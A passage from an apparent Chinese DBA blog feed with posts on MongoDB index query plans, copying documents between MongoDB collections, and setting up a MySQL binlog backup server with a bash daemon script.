class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">repset:PRIMARY> db.content_medium_hismatch.find({ update_time: { <span class="variable">$gte</span>: 1384099200000, <span class="variable">$lt</span>: 1384185600000 }, content_type_id: <span class="string">"28"</span> }).explain()</span><br><span class="line">{</span><br><span class="line">        <span class="string">"queryPlanner"</span> : {</span><br><span class="line">                <span class="string">"plannerVersion"</span> : 1,</span><br><span class="line">                <span class="string">"namespace"</span> : <span class="string">"feeds.content_medium_hismatch"</span>,</span><br><span class="line">                <span class="string">"indexFilterSet"</span> : <span class="literal">false</span>,</span><br><span class="line">                <span class="string">"parsedQuery"</span> : {</span><br><span class="line">                        <span class="string">"<span class="variable">$and</span>"</span> : [</span><br><span class="line">                                {</span><br><span class="line">                                        <span class="string">"content_type_id"</span> : {</span><br><span class="line">                                                <span class="string">"<span class="variable">$eq</span>"</span> : <span class="string">"28"</span></span><br><span class="line">                                        }</span><br><span class="line">                                },</span><br><span class="line">                                {</span><br><span class="line">                                        <span class="string">"update_time"</span> : {</span><br><span class="line">                                                <span class="string">"<span class="variable">$lt</span>"</span> : 1384185600000</span><br><span class="line">                                        }</span><br><span class="line">                                },</span><br><span class="line">                                {</span><br><span class="line">                                        <span class="string">"update_time"</span> : {</span><br><span class="line">                                                <span class="string">"<span class="variable">$gte</span>"</span> : 1384099200000</span><br><span class="line">                                        }</span><br><span class="line">                                }</span><br><span class="line">                        ]</span><br><span class="line">                },</span><br><span class="line">                <span class="string">"winningPlan"</span> : {</span><br><span class="line">                        <span class="string">"stage"</span> : <span class="string">"FETCH"</span>,</span><br><span class="line">                        <span class="string">"inputStage"</span> : {</span><br><span class="line">                                <span class="string">"stage"</span> : <span class="string">"IXSCAN"</span>,</span><br><span class="line">                                <span class="string">"keyPattern"</span> : {</span><br><span class="line">                                        <span class="string">"update_time"</span> : 1,</span><br><span class="line">                                        <span class="string">"content_type_id"</span> : 1</span><br><span class="line">                                },</span><br><span class="line">                                <span class="string">"indexName"</span> : <span class="string">"update_time_1_content_type_id_1"</span>,</span><br><span class="line">                                <span class="string">"isMultiKey"</span> : <span class="literal">false</span>,</span><br><span class="line">                                <span class="string">"multiKeyPaths"</span> : {</span><br><span class="line">                                        <span class="string">"update_time"</span> : [ ],</span><br><span class="line">                                        <span class="string">"content_type_id"</span> : [ ]</span><br><span class="line">                                },</span><br><span class="line">                                <span class="string">"isUnique"</span> : <span class="literal">false</span>,</span><br><span class="line">                                <span class="string">"isSparse"</span> : <span class="literal">false</span>,</span><br><span class="line">                                <span class="string">"isPartial"</span> : <span class="literal">false</span>,</span><br><span class="line">                                <span class="string">"indexVersion"</span> : 2,</span><br><span class="line">                                <span class="string">"direction"</span> : <span class="string">"forward"</span>,</span><br><span class="line">                                <span class="string">"indexBounds"</span> : {</span><br><span class="line">                                        <span class="string">"update_time"</span> : [</span><br><span class="line">                                                <span class="string">"[1384099200000.0, 1384185600000.0)"</span></span><br><span class="line">                                        ],</span><br><span class="line">                                        <span class="string">"content_type_id"</span> : [</span><br><span class="line">                                                <span class="string">"[\"28\", \"28\"]"</span></span><br><span class="line">                                        ]</span><br><span class="line">                                }</span><br><span class="line">                        }</span><br><span class="line">                },</span><br><span class="line">                <span class="string">"rejectedPlans"</span> : [</span><br><span class="line">                        {</span><br><span class="line">                                <span class="string">"stage"</span> : <span class="string">"FETCH"</span>,</span><br><span class="line">                                <span class="string">"filter"</span> : {</span><br><span class="line">                                        <span class="string">"content_type_id"</span> : {</span><br><span class="line">                                                <span class="string">"<span class="variable">$eq</span>"</span> : <span class="string">"28"</span></span><br><span class="line">                                        }</span><br><span class="line">                                },</span><br><span class="line">                                <span class="string">"inputStage"</span> : {</span><br><span class="line">                                        <span class="string">"stage"</span> : <span class="string">"IXSCAN"</span>,</span><br><span class="line">                                        <span class="string">"keyPattern"</span> : {</span><br><span class="line">                                                <span class="string">"update_time"</span> : 1</span><br><span class="line">                                        },</span><br><span class="line">                                        <span class="string">"indexName"</span> : <span class="string">"update_time_1"</span>,</span><br><span class="line">                                        <span class="string">"isMultiKey"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"multiKeyPaths"</span> : {</span><br><span class="line">                                                <span class="string">"update_time"</span> : [ ]</span><br><span class="line">                                        },</span><br><span class="line">                                        <span class="string">"isUnique"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"isSparse"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"isPartial"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"indexVersion"</span> : 2,</span><br><span class="line">                                        <span class="string">"direction"</span> : <span class="string">"forward"</span>,</span><br><span class="line">                                        <span class="string">"indexBounds"</span> : {</span><br><span class="line">                                                <span class="string">"update_time"</span> : [</span><br><span class="line">                                                        <span class="string">"[1384099200000.0, 1384185600000.0)"</span></span><br><span class="line">                                                ]</span><br><span class="line">                                        }</span><br><span class="line">                                }</span><br><span class="line">                        },</span><br><span class="line">                        {</span><br><span class="line">                                <span class="string">"stage"</span> : <span class="string">"FETCH"</span>,</span><br><span class="line">                                <span class="string">"filter"</span> : {</span><br><span class="line">                                        <span class="string">"<span class="variable">$and</span>"</span> : [</span><br><span class="line">                                                {</span><br><span class="line">                                                        <span class="string">"update_time"</span> : {</span><br><span class="line">                                                                <span class="string">"<span class="variable">$lt</span>"</span> : 1384185600000</span><br><span class="line">                                                        }</span><br><span class="line">                                                },</span><br><span class="line">                                                {</span><br><span class="line">                                                        <span class="string">"update_time"</span> : {</span><br><span class="line">                                                                <span class="string">"<span class="variable">$gte</span>"</span> : 1384099200000</span><br><span class="line">                                                        }</span><br><span class="line">                                                }</span><br><span class="line">                                        ]</span><br><span class="line">                                },</span><br><span class="line">                                <span class="string">"inputStage"</span> : {</span><br><span class="line">                                        <span class="string">"stage"</span> : <span class="string">"IXSCAN"</span>,</span><br><span class="line">                                        <span class="string">"keyPattern"</span> : {</span><br><span class="line">                                                <span class="string">"content_type_id"</span> : 1</span><br><span class="line">                                        },</span><br><span class="line">                                        <span class="string">"indexName"</span> : <span class="string">"content_type_id_1"</span>,</span><br><span class="line">                                        <span class="string">"isMultiKey"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"multiKeyPaths"</span> : {</span><br><span class="line">                                                <span class="string">"content_type_id"</span> : [ ]</span><br><span class="line">                                        },</span><br><span class="line">                                        <span class="string">"isUnique"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"isSparse"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"isPartial"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"indexVersion"</span> : 2,</span><br><span class="line">                                        <span class="string">"direction"</span> : <span class="string">"forward"</span>,</span><br><span class="line">                                        <span class="string">"indexBounds"</span> : {</span><br><span class="line">                                                <span class="string">"content_type_id"</span> : [</span><br><span class="line">                                                        <span class="string">"[\"28\", \"28\"]"</span></span><br><span class="line">                                                ]</span><br><span class="line">                                        }</span><br><span class="line">                                }</span><br><span class="line">                        },</span><br><span class="line">                        {</span><br><span class="line">                                <span class="string">"stage"</span> : <span class="string">"FETCH"</span>,</span><br><span class="line">                                <span class="string">"filter"</span> : {</span><br><span class="line">                                        <span class="string">"<span class="variable">$and</span>"</span> : [</span><br><span class="line">                                                {</span><br><span class="line">                                                        <span class="string">"update_time"</span> : {</span><br><span class="line">                                                                <span class="string">"<span class="variable">$lt</span>"</span> : 1384185600000</span><br><span class="line">                                                        }</span><br><span class="line">                                                },</span><br><span class="line">                                                {</span><br><span class="line">                                                        <span class="string">"update_time"</span> : {</span><br><span class="line">                                                                <span class="string">"<span class="variable">$gte</span>"</span> : 1384099200000</span><br><span class="line">                                                        }</span><br><span class="line">                                                }</span><br><span class="line">                                        ]</span><br><span class="line">                                },</span><br><span class="line">                                <span class="string">"inputStage"</span> : {</span><br><span class="line">                                        <span class="string">"stage"</span> : <span class="string">"IXSCAN"</span>,</span><br><span class="line">                                        <span class="string">"keyPattern"</span> : {</span><br><span class="line">                                                <span class="string">"content_type_id"</span> : 1,</span><br><span class="line">                                                <span class="string">"content_id"</span> : 1</span><br><span class="line">                                        },</span><br><span class="line">                                        <span class="string">"indexName"</span> : <span class="string">"content_type_id_1_content_id_1"</span>,</span><br><span class="line">                                        <span class="string">"isMultiKey"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"multiKeyPaths"</span> : {</span><br><span class="line">                                                <span class="string">"content_type_id"</span> : [ ],</span><br><span class="line">                                                <span class="string">"content_id"</span> : [ ]</span><br><span class="line">                                        },</span><br><span class="line">                                        <span class="string">"isUnique"</span> : <span class="literal">true</span>,</span><br><span class="line">                                        <span class="string">"isSparse"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"isPartial"</span> : <span class="literal">false</span>,</span><br><span class="line">                                        <span class="string">"indexVersion"</span> : 2,</span><br><span class="line">                                        <span class="string">"direction"</span> : <span class="string">"forward"</span>,</span><br><span class="line">                                        <span class="string">"indexBounds"</span> : {</span><br><span class="line">                                                <span class="string">"content_type_id"</span> : [</span><br><span class="line">                                                        <span class="string">"[\"28\", \"28\"]"</span></span><br><span class="line">                                                ],</span><br><span class="line">                                                <span class="string">"content_id"</span> : [</span><br><span class="line">                                                        <span class="string">"[MinKey, MaxKey]"</span></span><br><span class="line">                                                ]</span><br><span class="line">                                        }</span><br><span class="line">                                }</span><br><span class="line">                        }</span><br><span class="line">                ]</span><br><span class="line">        },</span><br><span class="line">        <span class="string">"serverInfo"</span> : {</span><br><span class="line">                <span class="string">"host"</span> : <span class="string">"public-ops-mongodb2.wj.babytree-ops.org"</span>,</span><br><span class="line">                <span class="string">"port"</span> : 29001,</span><br><span class="line">                <span class="string">"version"</span> : <span class="string">"3.4.2"</span>,</span><br><span class="line">                <span class="string">"gitVersion"</span> : <span class="string">"3f76e40c105fc223b3e5aac3e20dcd026b83b38b"</span></span><br><span class="line">        },</span><br><span class="line">        <span class="string">"ok"</span> : 1</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>发现正常走了索引。总算没有白做。可是代价太大了。这个教训告诉我，在不熟悉的数据库操作一定要慎重。针对线上操作，一定要再三慎重。引以为戒！</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpg&quot; class=&quot;full-image&quot; alt=&quot;a
      
    
    </summary>
    
      <category term="MongoDB" scheme="https://jiemin.wang/categories/MongoDB/"/>
    
    
      <category term="MongoDB" scheme="https://jiemin.wang/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>MongoDB 实现 MySQL 的 INSERT INTO SELECT</title>
    <link href="https://jiemin.wang/2019/04/15/mongodb-inset-into-select/"/>
    <id>https://jiemin.wang/2019/04/15/mongodb-inset-into-select/</id>
    <published>2019-04-15T09:08:35.000Z</published>
    <updated>2019-04-15T11:23:47.799Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>说金钱是罪恶，都在捞；说美女是祸水，都想要；说高处不胜寒，都在爬；说烟酒伤身体，都不戒；说天堂最美好，都不去！</strong></p></blockquote><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>公司业务有要将一个集合需要更改名称，需要DBA做配合</p><h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><ol><li>停止入库</li><li>确认已经把库入数据审完</li><li>重命名collections</li><li>创建新集合索引<br><code>db.antispam_resource.renameCollection("antispam_resource_20190415");</code><br><code>db.createCollection("antispam_resource");</code><br><code>db.antispam_resource.ensureIndex({createTs: 1, groupId: 1});</code><br><code>db.antispam_resource.ensureIndex({handleTs: 1, opUserId: 1});</code><br><code>db.antispam_resource.getIndexes();</code></li><li>新数据入库</li><li>看审核后台是否有新数据入库并审核</li><li>把最近1个月数据(antispam_resource_20190415)导入到antispam_resource</li><li>完毕</li></ol><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><p>查看一下原集合数据量<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.antispam_resource.find().count();</span><br></pre></td></tr></tbody></table></figure><p></p><p>进行更改名称操作<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.antispam_resource.renameCollection(<span class="string">"antispam_resource_20190415"</span>)</span><br></pre></td></tr></tbody></table></figure><p></p><p>进行创建索引<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db.antispam_resource.ensureIndex({createTs: 1, groupId: 1});</span><br><span class="line">db.antispam_resource.ensureIndex({handleTs: 1, opUserId: 1});</span><br><span class="line">db.antispam_resource.getIndexes();</span><br></pre></td></tr></tbody></table></figure><p></p><p>进行操作 MongoDB 版本的 INSERT INTO SELECT<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">示例:</span><br><span class="line">db.antispam_resource.find().forEach(<span class="keyword">function</span>(doc){</span><br><span class="line"> <span class="built_in">print</span>(doc._id);</span><br><span class="line">    db.antispam_resource.insert(doc)}</span><br><span class="line">  );</span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="操作详细步骤"><a href="#操作详细步骤" class="headerlink" title="操作详细步骤"></a>操作详细步骤</h2><p>查看原集合大于4月1号的数据<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mgset-11469021:PRIMARY> db.antispam_resource_20190415.find({createTs: { <span class="variable">$gte</span>: NumberLong(1554048000) }}).count()</span><br><span class="line">2726271</span><br><span class="line">mgset-11469021:PRIMARY> db.antispam_resource_20190415.find({createTs: { <span class="variable">$lte</span>: NumberLong(1554048000) }}).count()</span><br><span class="line">22264682</span><br><span class="line">mgset-11469021:PRIMARY> db.antispam_resource.find().count()</span><br><span class="line">27824</span><br><span class="line">mgset-11469021:PRIMARY> db.antispam_resource.find({ createTs: { <span class="variable">$gte</span>: NumberLong(1554048000) }}).count()</span><br><span class="line">27861</span><br><span class="line">mgset-11469021:PRIMARY> db.antispam_resource.find({ createTs: { <span class="variable">$lte</span>: NumberLong(1554048000) }}).count()</span><br><span class="line">0</span><br><span class="line">mgset-11469021:PRIMARY> db.antispam_resource.find({ createTs: { <span class="variable">$gte</span>: NumberLong(1554048000) }}).count()</span><br><span class="line">28074</span><br></pre></td></tr></tbody></table></figure><p></p><p>进行操作<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mgset-11469021:PRIMARY> var docs = db.antispam_resource_20190415.find({createTs: { <span class="variable">$gte</span>: NumberLong(1554048000) }});</span><br><span class="line">mgset-11469021:PRIMARY> docs.forEach( <span class="keyword">function</span>(d){ db.antispam_resource.insert(d) });</span><br></pre></td></tr></tbody></table></figure><p></p><img src="/2019/04/15/mongodb-inset-into-select/inset_into_select.png" title="inset_into_select"><p>数据在慢慢插入到新的集合中</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mgset-11469021:PRIMARY> db.antispam_resource_20190415.find({createTs: { <span class="variable">$gte</span>:1554048000, <span class="variable">$lte</span>:1555311600}}).count()</span><br><span class="line">2726271</span><br><span class="line">mgset-11469021:PRIMARY> db.antispam_resource.find({createTs: { <span class="variable">$gte</span>:1554048000, <span class="variable">$lte</span>:1555311600}}).count()</span><br><span class="line">2726271</span><br></pre></td></tr></tbody></table></figure><p>终于导完</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpg&quot; class=&quot;full-image&quot; alt=&quot;a
      
    
    </summary>
    
      <category term="MongoDB" scheme="https://jiemin.wang/categories/MongoDB/"/>
    
    
      <category term="MongoDB" scheme="https://jiemin.wang/tags/MongoDB/"/>
    
  </entry>
  
  <entry>
    <title>MySQL BINLOG Server</title>
    <link href="https://jiemin.wang/2019/04/03/mysql-binlog-server/"/>
    <id>https://jiemin.wang/2019/04/03/mysql-binlog-server/</id>
    <published>2019-04-03T08:02:33.000Z</published>
    <updated>2019-04-03T08:14:41.076Z</updated>
    
    <content type="html"><![CDATA[<span itemprop="image" itemscope itemtype="http://schema.org/ImageObject"><img itemprop="url image" src="timg.jpeg" class="full-image" alt="alt" title="title"><meta itemprop="width" content="auto"><meta itemprop="height" content="auto"></span><blockquote class="blockquote-center"><p><strong>雷锋做了好事不留名，但是每一件事情都记到日记里面。</strong></p></blockquote><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>MySQL Binlog Server: 它使用 <code>mysqlbinlog</code> 命令以 <code>daemon</code> 进程的方式模拟一个 <code>slave</code> 的 <code>IO</code> 线程与主库连接，可以很方便地即时同步主库的 <code>binlog</code>，以便弥补定时备份策略中最近一次备份到下一次备份完成之前这段时间内的数据容易丢失的问题。</p><p>做好 MySQL 日志的备份，是数据安全的一个重要保证。以前通过写程序来实现，从 MySQL 5.6 出现以后，可以使用 <code>mysqlbinlog</code> 命令实现，不用写程序了。</p><h2 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h2><p>创建复制账号<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GRANT REPLICATION SLAVE ON *.* TO <span class="string">'repl'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'repl'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql 5.7</span><br><span class="line">CREATE USER <span class="string">'repl'</span>@<span class="string">'%'</span> IDENTIFIED BY <span class="string">'repl'</span>;</span><br><span class="line">GRANT REPLICATION SLAVE ON *.* TO <span class="string">'repl'</span>@<span class="string">'%'</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></tbody></table></figure><h2 id="创建BINLOG-SERVER"><a href="#创建BINLOG-SERVER" class="headerlink" title="创建BINLOG SERVER"></a>创建BINLOG SERVER</h2><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mysqlbinlog -R --raw --host='192.168.199.230' --port=3306 --user='repl' --password='unixfbi' --stop-never --stop-never-slave-server-id=2313306 mysql-bin.000001 --result-file=/data/mysql/mysql3306/logs/ &</span></span><br></pre></td></tr></tbody></table></figure><p>命令参数介绍：</p><ul><li><strong>-R –read-from-remote-server</strong> :表示从远程机器上读取 binlog,要确保远程 mysql 存储，需要提供–host, –user, –password 参数; 使用该选项时，mysqlbinlog 会伪装成一个 slave，连接读取，请求指定的 binlog file，主库获取接收到这个请求之后就创建一个 binlog dump 线程推送 binlog 给 mysqlbinlog server。</li><li><strong>–raw</strong>: 以 binlog 格式存储日志，方便后期使用;</li><li><strong>–host</strong>: 远程库的主机 IP 或者主机名;</li><li><strong>–port</strong>: 远端库的端口号;</li><li><strong>–user</strong>: 远程库上用于复制的账号;</li><li><strong>–password</strong>: 远端库上复制账号的密码;</li><li><strong>–stop-never</strong>: 一直连接到远程的 server 上读取 binlog 日志，直接到远程的 server 关闭后才会退出。或是被 pkill 掉;</li><li><strong>–stop-never-slave-server-id</strong>: 如果需要启动多个 binlog server ，需要给 binlog server 指定 server-id 。如果需要启动多个 binlog server,需要给 binlog server 指定 server-id(默认是 65535)，可以利用 –stop-never-slave-server-id 变更;</li><li><strong>mysql-bin.0000001</strong> 这个日志名表示从那个日志开始读取;</li><li><strong>–result-file</strong>: 指定存储到本地的目录，注意后缀需要加上/，否则 mysqlbinlog 命令会认为是保存文件的前缀。若指定了–raw 参数，-r 的值指定 binlog 的存放目录和文件名前缀；若没有指定–raw 参数，-r 的值指定文本存放的目录和文件名。</li></ul><blockquote><p>注意：<br>  使用–raw 连接 master 时，以 4k 为单位写入磁盘。并不能实时写入磁盘。那么不够 4k 时，binlog server 什么时候才会把日志写入磁盘呢？</p></blockquote><blockquote><p>有两种情况：</p></blockquote><blockquote><pre><code>第一：binlog server 和主库断开时，第二：master 执行 flush logs 都会实时把日志写入磁盘。</code></pre><p>mysqlbinlog raw 有一个 4k 的 Buffer ，够 4k 就发车。</p></blockquote><h2 id="设置-mysqlbinlog-为守护进程"><a href="#设置-mysqlbinlog-为守护进程" class="headerlink" title="设置 mysqlbinlog 为守护进程"></a>设置 mysqlbinlog 为守护进程</h2><p>如果 master 重启的话，binlog server 上的 mysqlbinlog 进程就会退出，所以我们写个脚本把 mysqlbinlog 设置为守护进程方式运行<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash </span></span><br><span class="line">BACKUP_BIN=/usr/<span class="built_in">local</span>/mysql/bin/mysqlbinlog</span><br><span class="line">LOCAL_BACKUP_DIR=/data/mysql/mysql3306/logs/</span><br><span class="line">BACKUP_LOG=/tmp/backup.log</span><br><span class="line">REMOTE_HOST=192.168.199.230</span><br><span class="line">REMOTE_PORT=3306</span><br><span class="line">REMOTE_USER=repl</span><br><span class="line">REMOTE_PASS=unixfbi</span><br><span class="line">FIRST_BINLOG=mysql-bin.000001</span><br><span class="line">SLAVE_SERVER_ID=2313306</span><br><span class="line"><span class="comment"># wait for 10s</span></span><br><span class="line">SLEEP_SECONDS=10</span><br><span class="line"><span class="built_in">cd</span> <span class="variable">${LOCAL_BACKUP_DIR}</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> :</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  <span class="keyword">if</span> [ `ls -A <span class="string">"<span class="variable">${LOCAL_BACKUP_DIR}</span>"</span> |wc -l` -eq 0 ];<span class="keyword">then</span></span><br><span class="line">     LAST_FILE=<span class="variable">${FIRST_BINLOG}</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">     LAST_FILE=`ls -l <span class="variable">${LOCAL_BACKUP_DIR}</span> |tail -n 1 |awk <span class="string">'{print $NF}'</span>`</span><br><span class="line">  <span class="keyword">fi</span></span><br><span class="line">  <span class="variable">${BACKUP_BIN}</span> --raw -R --stop-never --host=<span class="variable">${REMOTE_HOST}</span> --port=<span class="variable">${REMOTE_PORT}</span> --user=<span class="variable">${REMOTE_USER}</span> --password=<span class="variable">${REMOTE_PASS}</span>  --stop-never --stop-never-slave-server-id=<span class="variable">${SLAVE_SERVER_ID}</span> <span class="variable">${LAST_FILE}</span> --result-file=<span class="variable">${LOCAL_BACKUP_DIR}</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"`date +"</span>%Y/%m/%d %H:%M:%S<span class="string">"` mysqlbinlog is stoped,return code: $?"</span> | tee -a <span class="variable">${BACKUP_LOG}</span></span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"<span class="variable">${SLEEP_SECONDS}</span>s will continue !"</span> | tee -a <span class="variable">${BACKUP_LOG}</span>  </span><br><span class="line">  sleep <span class="variable">${SLEEP_SECONDS}</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>执行脚本<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nohup binlog_cp.sh &</span></span><br></pre></td></tr></tbody></table></figure><p></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://www.unixfbi.com/291.html" target="_blank" rel="noopener">UnixFBI 运维特工</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpeg&quot; class=&quot;full-image&quot; alt=&quot;
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL Innodb表空间传输</title>
    <link href="https://jiemin.wang/2019/04/03/innodb-tablespace-copying/"/>
    <id>https://jiemin.wang/2019/04/03/innodb-tablespace-copying/</id>
    <published>2019-04-03T07:52:46.000Z</published>
    <updated>2019-04-03T08:01:04.077Z</updated>
    
